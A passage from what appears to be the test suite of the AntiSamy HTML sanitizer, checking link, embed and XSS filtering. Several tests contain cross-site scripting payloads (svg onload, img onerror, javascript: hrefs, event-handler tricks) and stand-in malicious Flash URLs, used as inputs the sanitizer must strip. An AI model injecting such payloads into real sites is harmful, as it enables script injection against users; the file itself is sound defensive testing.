            assertTrue(as.scan("<a href=\"blah\" bad=\"true\">link</a>", revisedPolici, AntiSamy.SAX).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

            // rel with bad value gets corrected
            assertTrue(as.scan("<a href=\"blah\" rel=\"blh\">link</a>", revisedPolici, AntiSamy.DOM).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
            assertTrue(as.scan("<a href=\"blah\" rel=\"blh\">link</a>", revisedPolici, AntiSamy.SAX).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

            // correct attribute doesnt get messed with
            assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\">link</a>", policy, AntiSamy.DOM).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
            assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\">link</a>", policy, AntiSamy.SAX).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

            // if two correct attributes, only one remaining after scan
            assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", policy, AntiSamy.DOM)
                    .getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
            assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", policy, AntiSamy.SAX)
                    .getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

            // test if value is off - does it add?

            assertTrue(!as.scan("a href=\"blah\">link</a>", policy, AntiSamy.DOM).getCleanHTML().contains("nofollow"));
            assertTrue(!as.scan("a href=\"blah\">link</a>", policy, AntiSamy.SAX).getCleanHTML().contains("nofollow"));

            policy.cloneWithDirective(Policy.ANCHORS_NOFOLLOW, val);

        }
        catch (Exception e) {
            fail("Caught exception in testNofollowAnchors(): " + e.getMessage());
        }
    }

    @Test
    public void validateParamAsEmbed() throws ScanException, PolicyException {
        // activate policy setting for this test
        Policy revised = policy.cloneWithDirective(Policy.VALIDATE_PARAM_AS_EMBED, "true")
                .cloneWithDirective(Policy.FORMAT_OUTPUT, "false").cloneWithDirective(Policy.USE_XHTML, "true");

        // let's start with a YouTube embed
        String input =
                "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        String expectedOutput =
                "<object height=\"340\" width=\"560\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed allowfullscreen=\"true\" allowscriptaccess=\"always\" height=\"340\" src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" width=\"560\" /></object>";
        CleanResults cr = as.scan(input, revised, AntiSamy.DOM);
        assertTrue(cr.getCleanHTML().contains(expectedOutput));

        String saxExpectedOutput =
                "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
        cr = as.scan(input, revised, AntiSamy.SAX);
        assertTrue(cr.getCleanHTML().equals(saxExpectedOutput));

        // now what if someone sticks malicious URL in the value of the
        // value attribute in the param tag? remove that param tag
        input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://supermaliciouscode.com/badstuff.swf\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        expectedOutput =
                "<object height=\"340\" width=\"560\"><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed allowfullscreen=\"true\" allowscriptaccess=\"always\" height=\"340\" src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" width=\"560\" /></object>";
        saxExpectedOutput =
                "<object width=\"560\" height=\"340\"><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
        cr = as.scan(input, revised, AntiSamy.DOM);
        assertTrue(cr.getCleanHTML().contains(expectedOutput));

        cr = as.scan(input, revised, AntiSamy.SAX);
        assertTrue(cr.getCleanHTML().equals(saxExpectedOutput));

        // now what if someone sticks malicious URL in the value of the src
        // attribute in the embed tag? remove that embed tag
        input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://hereswhereikeepbadcode.com/ohnoscary.swf\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        expectedOutput =
                "<object height=\"340\" width=\"560\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /></object>";
        saxExpectedOutput =
                "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /></object>";

        cr = as.scan(input, revised, AntiSamy.DOM);
        assertTrue(cr.getCleanHTML().contains(expectedOutput));
        CleanResults scan = as.scan(input, revised, AntiSamy.SAX);
        assertTrue(scan.getCleanHTML().equals(saxExpectedOutput));
    }

    @Test
    public void compareSpeedsShortStrings() throws IOException, ScanException, PolicyException {

        double totalDomTime = 0;
        double totalSaxTime = 0;

        int testReps = 1000;

        String html = "<body> hey you <img/> out there on your own </body>";

        for (int j = 0; j < testReps; j++) {
            totalDomTime += as.scan(html, policy, AntiSamy.DOM).getScanTime();
            totalSaxTime += as.scan(html, policy, AntiSamy.SAX).getScanTime();
        }

        System.out.println("Total DOM time short string: " + totalDomTime);
        System.out.println("Total SAX time short string: " + totalSaxTime);
    }

    @Test
    public void profileDom() throws IOException, ScanException, PolicyException {
        runProfiledTest(AntiSamy.DOM);
    }

    @Test
    public void profileSax() throws IOException, ScanException, PolicyException {
        runProfiledTest(AntiSamy.SAX);
    }

    private void runProfiledTest(int scanType) throws ScanException, PolicyException {
        double totalDomTime;

        warmup(scanType);

        int testReps = 9999;

        String html = "<body> hey you <img/> out there on your own </body>";

        Double each = 0D;
        int repeats = 10;
        for (int i = 0; i < repeats; i++) {
            totalDomTime = 0;
            for (int j = 0; j < testReps; j++) {
                totalDomTime += as.scan(html, policy, scanType).getScanTime();
            }
            each = each + totalDomTime;
            System.out.println("Total " + (scanType == AntiSamy.DOM ? "DOM" : "SAX") + " time 9999 reps short string: "
                    + totalDomTime);
        }
        System.out.println("Average time: " + (each / repeats));
    }

    private void warmup(int scanType) throws ScanException, PolicyException {
        int warmupReps = 15000;

        String html = "<body> hey you <img/> out there on your own </body>";

        for (int j = 0; j < warmupReps; j++) {
            as.scan(html, policy, scanType).getScanTime();
        }
    }

    @Test
    public void comparePatternSpeed() throws IOException, ScanException, PolicyException {

        final Pattern invalidXmlCharacters =
                Pattern.compile("[\\u0000-\\u001F\\uD800-\\uDFFF\\uFFFE-\\uFFFF&&[^\\u0009\\u000A\\u000D]]");

        int testReps = 10000;

        String html = "<body> hey you <img/> out there on your own </body>";

        String s = null;
        long start = System.currentTimeMillis();
        for (int j = 0; j < testReps; j++) {
            s = invalidXmlCharacters.matcher(html).replaceAll("");
        }
        long total = System.currentTimeMillis() - start;

        start = System.currentTimeMillis();
        Matcher matcher;
        for (int j = 0; j < testReps; j++) {
            matcher = invalidXmlCharacters.matcher(html);
            if (matcher.matches()) {
                s = matcher.replaceAll("");
            }
        }
        long total2 = System.currentTimeMillis() - start;

        assertNotNull(s);
        System.out.println("replaceAllDirect " + total);
        System.out.println("match then replace: " + total2);
    }

    @Test
    public void testOnsiteRegex() throws ScanException, PolicyException {
        assertIsGoodOnsiteURL("foo");
        assertIsGoodOnsiteURL("/foo/bar");
        assertIsGoodOnsiteURL("../../di.cgi?foo&amp;3D~");
        assertIsGoodOnsiteURL("/foo/bar/1/sdf;jsessiond=1f1f12312_123123");
    }

    void assertIsGoodOnsiteURL(String url) throws ScanException, PolicyException {
        String html = as.scan("<a href=\"" + url + "\">X</a>", policy, AntiSamy.DOM).getCleanHTML();
        assertTrue(html.contains("href=\""));
    }

    @Test
    public void issue10() throws ScanException, PolicyException {
        assertFalse(as.scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("javascript"));
        assertFalse(as.scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("javascript"));
    }

    @Test
    public void issue147() throws ScanException, PolicyException {
        URL url = getClass().getResource("/antisamy-tinymce.xml");

        Policy pol = Policy.getInstance(url);
        as.scan("<table><tr><td></td></tr></table>", pol, AntiSamy.DOM);
    }

    @Test
    public void issue75() throws ScanException, PolicyException {
        URL url = getClass().getResource("/antisamy-tinymce.xml");
        Policy pol = Policy.getInstance(url);
        as.scan("<script src=\"<. \">\"></script>", pol, AntiSamy.DOM);
        as.scan("<script src=\"<. \">\"></script>", pol, AntiSamy.SAX);
    }

    @Test
    public void issue144() throws ScanException, PolicyException {
        String pinata = "pi\u00f1ata";
        System.out.println(pinata);
        CleanResults results = as.scan(pinata, policy, AntiSamy.DOM);
        String cleanHTML = results.getCleanHTML();
        assertEquals(pinata, cleanHTML);
    }

    @Test
    public void testWhitespaceNotBeingMangled() throws ScanException, PolicyException {
        String test = "<select name=\"name\"><option value=\"Something\">Something</select>";
        String expected = "<select name=\"name\"><option value=\"Something\">Something</option></select>";
        Policy preserveSpace = policy.cloneWithDirective(Policy.PRESERVE_SPACE, "true");
        CleanResults preserveSpaceResults = as.scan(test, preserveSpace, AntiSamy.SAX);
        assertEquals(expected, preserveSpaceResults.getCleanHTML());
    }

    @Test
    public void testDataTag159() throws ScanException, PolicyException {
        /* issue #159 - allow dynamic HTML5 data-* attribute */
        String good = "<p data-tag=\"abc123\">Hello World!</p>";
        String bad = "<p dat-tag=\"abc123\">Hello World!</p>";
        String goodExpected = "<p data-tag=\"abc123\">Hello World!</p>";
        String badExpected = "<p>Hello World!</p>";
        // test good attribute "data-"
        CleanResults cr = as.scan(good, policy, AntiSamy.SAX);
        String s = cr.getCleanHTML();
        assertEquals(goodExpected, s);
        // test bad attribute "dat-"
        cr = as.scan(bad, policy, AntiSamy.SAX);
        s = cr.getCleanHTML();
        assertEquals(badExpected, s);
    }

    public void testAnotherXSS() throws ScanException, PolicyException {
        String test = "<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>";
        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);

        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);

        assertEquals(results_sax.getCleanHTML(), results_dom.getCleanHTML());
        assertEquals("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>", results_dom.getCleanHTML());
    }

    public void testIssue2() throws ScanException, PolicyException {
        String test = "<style onload=alert(1)>h1 {color:red;}</style>";
        assertFalse(as.scan(test, policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertFalse(as.scan(test, policy, AntiSamy.SAX).getCleanHTML().contains("alert"));
    }

    /*
     * Mailing list user sent this in. Didn't work, but good test to leave in.
     */
    @Test
    public void testUnknownTags() throws ScanException, PolicyException {
        String test = "<%/onmouseover=prompt(1)>";
        CleanResults saxResults = as.scan(test, policy, AntiSamy.SAX);
        CleanResults domResults = as.scan(test, policy, AntiSamy.DOM);
        System.out.println("OnUnknown (SAX): " + saxResults.getCleanHTML());
        System.out.println("OnUnknown (DOM): " + domResults.getCleanHTML());
        assertFalse(saxResults.getCleanHTML().contains("<%/"));
        assertFalse(domResults.getCleanHTML().contains("<%/"));
    }

    @Test
    public void testXss5() throws Exception {
        // String content = "<img//onerror='alert(1' src='/adss'> <TABLE> && ,: # %23 SD SSDADA";
        // String content="<img /onerror=alert(1' > ?=+ adad & sda %6d a ";
        String content = "<svg 1 onload='alert(1)'>";
        Assert.assertTrue(testXss(content));
        content = "<svg/ a , onload='alert(1)'>";
        Assert.assertTrue(testXss(content));

        content = "<svg 1 / onload='alert(1)'>";
        Assert.assertTrue(testXss(content));

        content = "<svg/ / onload='alert(1)'>";
        Assert.assertTrue(testXss(content));

        content = "<style onload=alert(1)>h1 {color:red;}</style>sds";
        Assert.assertTrue(testXss(content));

        content = "<img /onerror=alert(1' > ?=+ adad &   sda %6d a ";
        Assert.assertTrue(testXss(content));
        content = "<img//onerror='alert(1'  src='/adss'> <TABLE> && ,:  # %23 SD SSDADA";
        Assert.assertTrue(testXss(content));

        content = "<img//onerror='alert(1'  src='/adss' sad <script></script>";
        Assert.assertTrue(testXss(content));

        content = "<svg/onload='alert(1)'>";
        Assert.assertTrue(testXss(content));

        content = "chen\"></div><svg/onload=\"confirm(99)\">";
        Assert.assertTrue(testXss(content));

        // content = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">";
        // Assert.assertTrue(testXss(content));

        content =
                "Miss chen\"></div><svg/onload=\"confirm(99)\"Miss chen\"></div><svg/onload=\"confirm(99)\"Miss chen\"></div><svg/onload=\"confirm(99)\"Miss chen\"></div><svg/onload=\"confirm(99)\"";
        Assert.assertTrue(testXss(content));

        content = "<body/onhashchange=alert(1)><a href=#>clickit";
        Assert.assertTrue(testXss(content));

        assertTrue(testXss("<IMG LOWSRC=\"javascript:alert('XSS')\">"));

        assertTrue(testXss("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"));
    }

    @Test
    public void testXss6() throws Exception {
        // String content = "<img//onerror='alert(1' src='/adss'> <TABLE> && ,: # %23 SD SSDADA";
        // String content="<img /onerror=alert(1' > ?=+ adad & sda %6d a ";
        String content = "< svg 1 onload=daddsda adsd dads@dadsd > 1";
        Assert.assertFalse(testXss(content));
        content = "ass<dads a , onload 'alert(1)' >";
        Assert.assertFalse(testXss(content));

        content = "ass<dads a , onload  'alert(1)' 1>232";
        Assert.assertFalse(testXss(content));

        content = "when 1<ass a , aaaa='alert(1)' ss 1>232";
        Assert.assertFalse(testXss(content));

        content = "<svg 1 / onload='alert(1)'>";
        testXss(content);

    }

    @Test
    public void testXss7() throws Exception {
        // String content = "<img//onerror='alert(1' src='/adss'> <TABLE> && ,: # %23 SD SSDADA";
        // String content="<img /onerror=alert(1' > ?=+ adad & sda %6d a ";
        String content =
                "<br />Miss chen&quot;&gt;&lt;/div&gt;&lt;svg/ / / / onload=&quot;confirm(99)&quot;&nbsp;&nbsp;adwefw<br />&nbsp; >";
        Assert.assertFalse(testXssWithAttr(content));

        content =
                "<z a= <br />Miss chen&quot;&gt;&lt;/div&gt;&lt;svg/ / / / onload=&quot;confirm(99)&quot;&nbsp;&nbsp;adwefw<br />&nbsp; >";
        Assert.assertFalse(testXssWithAttr(content));

        content =
                "<z a=Thanks for your interested in our cnc glass machinery ZXX-1325B, which can processing glass with drilling ,notching and grinding once time. >";
        Assert.assertFalse(testXssWithAttr(content));

        content =
                ":<p style=\"color:#006600; font-family:Times New Roman, Times, serif; font-size:16px\"><em><strong>This info is used for testing</strong></em></p><img alt=\"\" height=\"300px\" src=\"image?tid=25&amp;id=qrSTmtwyrhoH&amp;cache=0&amp;lan_code=0\" srcid=\"247993505\" width=\"300px\" /><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:500px\">    <tbody>         <tr>                    <td colspan=\"3\" style=\"background-color:#f2fff2\">product detail</td>              </tr>           <tr>                    <td>V01</td>                    <td>red</td>                    <td>1.50m</td>          </tr>     </tbody></table>This info is used for testing! This info is used for testing!<br />This info is used for testing! This info is used for testing!<br />This info is used for testing! This info is used for testing!<br /><br /><br />Miss chen&quot;&gt;&lt;/div&gt;&lt;svg/ / / / onload=&quot;confirm(99)&quot;&nbsp;<br />&nbsp; >";
        Assert.assertFalse(testXss(content));
        content =
                "<strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><span style=\"font-size:18px;\">P\n"
                        + "lastic Room Acrylic Hotel Supplies Storage Box</span></span></strong><h3><br /><span style=\"font-size:16px;\">Thank you for your visit my shop .It is my pleasure.</span></h3><span style\n"
                        + "=\"font-size:16px;\">Resin Product &nbsp;such as : Consumable Box .Remote Holder . Tray.Cup Mat.Soap Dispenser<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n"
                        + "&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Tissue Box.Towel Plate.Table Plate.Vase. etc.</span><br /><br /><br /><br /><img height=\"750px\" srcid=\"303\n"
                        + "053515\" width=\"750px\" /><br /><br />&nbsp;<table style=\"height:689px;width:750px;\"><colgroup><col /><col /><col /><col /></colgroup><tbody><tr><td colspan=\"4\" style=\"height:39.00\n"
                        + "pf;text-align:center;width:460.52pt;\"><strong><span style=\"font-size:20px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Product&nbsp;Infor\n"
                        + "mation</span></span></span></strong></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span styl\n"
                        + "e=\"font-family:Arial, Helvetica, sans-serif;\">Name</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:172.53pt;\"><span style=\"font-size:16px;\"><span style=\n"
                        + "\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Hotel&nbsp;Amenity</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:136.53pt;\"><\n"
                        + "span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Item</span></span></span></td><td style=\"height:39.00pf;text-alig\n"
                        + "n:general;width:210.78pt;\"><span style=\"font-size:16px;\">XLS-08</span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><spa\n"
                        + "n style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MOQ</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:172.53pt;\"><span st\n"
                        + "yle=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">50sets</span></span></span></td><td style=\"height:39.00pf;text-align:gen\n"
                        + "eral;width:136.53pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Color</span></span></span></td><td style=\\\n"
                        + "\"height:39.00pf;text-align:general;width:210.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">As&nbsp;samp\n"
                        + "le</span></span></span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-fami\n"
                        + "ly:Arial, Helvetica, sans-serif;\">Payment&nbsp;term</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:172.53pt;\"><span style=\"font-size:16px;\"><span style=\n"
                        + "\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">T/T,L/C,Paypal,<br />Western&nbsp;Union</span></span></span></td><td style=\"height:39.00pf;text-align:genera\n"
                        + "l;width:136.53pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Material</span></span></span></td><td style=\\\n"
                        + "\"height:39.00pf;text-align:general;width:210.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Material</sp\n"
                        + "an></span></span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Ari\n"
                        + "al, Helvetica, sans-serif;\">Logo</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:172.53pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\">\n"
                        + "<span style=\"font-family:Arial, Helvetica, sans-serif;\">Printed,Pressing</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:136.53pt;\"><span style=\"font-siz\n"
                        + "e:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Usage</span></span></span></td><td style=\"height:39.00pf;text-align:general;width:210.\n"
                        + "78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Hotel,&nbsp;estaurant,<br />Office,Home</span></span></sp\n"
                        + "an></td></tr><tr><td style=\"height:141.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica\n"
                        + ", sans-serif;\">Sample&nbsp;cost</span></span></span></td><td colspan=\"3\" style=\"height:141.00pf;text-align:center;width:481.52pt;\"><span style=\"font-size:16px;\"><span style=\"colo\n"
                        + "r:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Customized&nbsp;sample:&nbsp;&nbsp;&nbsp;We&nbsp;will&nbsp;charge&nbsp;two&nbsp;times&nbsp;of&nbsp;<br />sample&nbs\n"
                        + "p;fee.&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n"
                        + "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.When&nbsp;the&nbsp;buyer&nbsp;places&nbsp;an&nbsp;order,we&nbsp;will&nbsp;<br />return&nbsp;the&nbsp;sample&nbsp;fee.<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&\n"
                        + "nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.The&nbsp;express&\n"
                        + "nbsp;expense&nbsp;should&nbsp;be&nbsp;paid&nbsp;<br />by&nbsp;the&nbsp;client.&nbsp;</span></span></span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><spa\n"
                        + "n style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Delivery&nbsp;time</span></span></span></td><td colspan=\"3\" style=\\\n"
                        + "\"height:39.00pf;text-align:center;width:481.52pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">10-25days&nbs\n"
                        + "p;for&nbsp;quantity&nbsp;under&nbsp;100sets;25-60days&nbsp;<br />for&nbsp;100-1000sets.</span></span></span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><\n"
                        + "span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Inventory</span></span></span></td><td colspan=\"3\" style=\"heigh\n"
                        + "t:39.00pf;text-align:center;width:481.52pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Customized&nbsp;pro\n"
                        + "ducts,no&nbsp;inventory.</span></span></span></td></tr><tr><td style=\"height:64.00pf;text-align:general;width:75.78pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><\n"
                        + "span style=\"font-family:Arial, Helvetica, sans-serif;\">Packing</span></span></span></td><td colspan=\"3\" style=\"height:64.00pf;text-align:center;width:481.52pt;\"><span style=\"font-\n"
                        + "size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Within&nbsp;a&nbsp;waterproof&nbsp;membrane,outside&nbsp;carton&nbsp;packaging,<br /\n"
                        + ">can&nbsp;make&nbsp;adjustments&nbsp;based&nbsp;on&nbsp;product&nbsp;size.</span></span></span></td></tr><tr><td style=\"height:39.00pf;text-align:general;width:75.78pt;\"><span style=\"\n"
                        + "font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Remark</span></span></span></td><td colspan=\"3\" style=\"height:39.00pf;text-a\n"
                        + "lign:center;width:481.52pt;\"><span style=\"font-size:16px;\"><span style=\"color:#000000;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">Customers&nbsp;can&nbsp;buy&nbsp;on\n"
                        + "e&nbsp;set&nbsp;or&nbsp;one&nbsp;of&nbsp;the&nbsp;product&nbsp;alone.</span></span></span></td></tr></tbody></table><br /><img srcid=\"303053525\" /><br /><br /><br /><span style=\"font-\n"
                        + "size:18px;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &n\n"
                        + "bsp;&nbsp;</span></strong></span><strong><span style=\"font-size:20px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">&nbsp; &nbsp; &nbsp;</span></span></strong><strong><spa\n"
                        + "n style=\"font-size:20px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><span style=\"color:#333333;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">&nbsp; &nbs\n"
                        + "p; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />Selected material:&nbsp;not easy to scratch, the use\n"
                        + " of healthy and stable ink color,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;Logo that doesn't fade, enhancing the overall level\n"
                        + " of the hotel.</span></span></span></span><br /><br /><br /><br /><span style=\"font-size:16px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><span style=\"color:#333333;\"\n"
                        + "><span style=\"font-family:Arial, Helvetica, sans-serif;\"><img srcid=\"303053535\" /></span></span></span></span></strong><br /><br /><br /><br /><br /><strong><span style=\"font-size:2\n"
                        + "0px;\">Advantages:&nbsp;</span></strong><span style=\"font-size:18px;\"> important plasticity of polymer materials, with good transparency,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\n"
                        + " &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;chemical stability and weather resistance, easy to dye, easy processing,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb\n"
                        + "sp; &nbsp; &nbsp; &nbsp; &nbsp; beautiful appearance, with crystal-like transparency.</span><br /><br /><br /><br /><br /><span style=\"font-size:16px;\"><img srcid=\"303053545\" /></spa\n"
                        + "n><br /><br /><br /><br /><strong><span style=\"font-size:20px;\">Features:&nbsp;&nbsp;1&gt; not easy to scratch, 2&gt; thickening, and durable,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &\n"
                        + "nbsp; &nbsp; &nbsp; &nbsp;3&gt; exquisite and beautiful, 4&gt; deep-set and fall-proof.</span></strong><br /><br /><br /><br /><img height=\"750px\" srcid=\"303053555\" width=\"750px\" /\n"
                        + "><br /><br /><br /><br /><br /><strong><span style=\"font-size:20px;\">Simple lines: clean modernism, which gives you a comfortable feeling.<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp\n"
                        + "; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Fashion is an endless film, and minimalism is its style.</span></strong><br /><br /><img srcid=\"303053565\" /><br /><br /><br /><br /><span style=\"f\n"
                        + "ont-size:16px;\"><span style=\"color:#006600;\"><strong>1. How&amp;When can I get the price?&nbsp;</strong></span><br />Email us your inquiry or communicate online, state your specificat\n"
